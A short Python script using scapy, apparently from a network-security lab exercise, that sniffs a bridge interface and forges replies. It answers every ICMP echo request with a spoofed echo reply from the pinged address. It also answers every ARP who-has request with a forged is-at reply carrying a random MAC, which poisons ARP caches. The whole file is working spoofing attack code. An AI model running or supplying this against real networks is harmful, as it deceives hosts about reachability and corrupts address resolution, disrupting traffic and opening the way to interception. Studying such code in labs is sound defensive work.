#!/usr/bin/env python3
from scapy.all import *

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0

ARP_WHO_HAS = 1
ARP_IS_AT = 2

def random_mac():
    return "fa:fa:fa:%02x:%02x:%02x" % (
                             random.randint(0, 255),
                             random.randint(0, 255),
                             random.randint(0, 255))


def spoofing(pkt):
    # pkt.show()
    # print(pkt[ICMP].type)

    if pkt.haslayer(ICMP) and pkt[ICMP].type == ICMP_ECHO_REQUEST:
        # print(pkt[IP].src)
        # print(pkt[ICMP].type)

        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        icmp = ICMP(type=ICMP_ECHO_REPLY, id=pkt[ICMP].id, seq=pkt[ICMP].seq)

        print(f"Ping request from {pkt[IP].src} to {pkt[IP].dst}\nSending reply")
        
        packet = ip/icmp/pkt[Raw].load           
        send(packet)
        # packet.show()
    
    elif pkt.haslayer(ARP) and pkt[ARP].op == ARP_WHO_HAS:
        
        time.sleep(1)

        arp = ARP(op = ARP_IS_AT, plen = 4, hwlen = 6, hwsrc = random_mac(), hwdst = pkt[ARP].hwsrc, psrc = pkt[ARP].pdst, pdst = pkt[ARP].psrc)
        print(f"ARP request from {pkt[ARP].psrc} to {pkt[ARP].pdst}\nSending reply")

        # ethernet.show()
        send(arp)
        # arp.show()


pkt_icmp = sniff(iface='br-d86ec7a3cd9b:', filter='icmp || arp', prn=spoofing)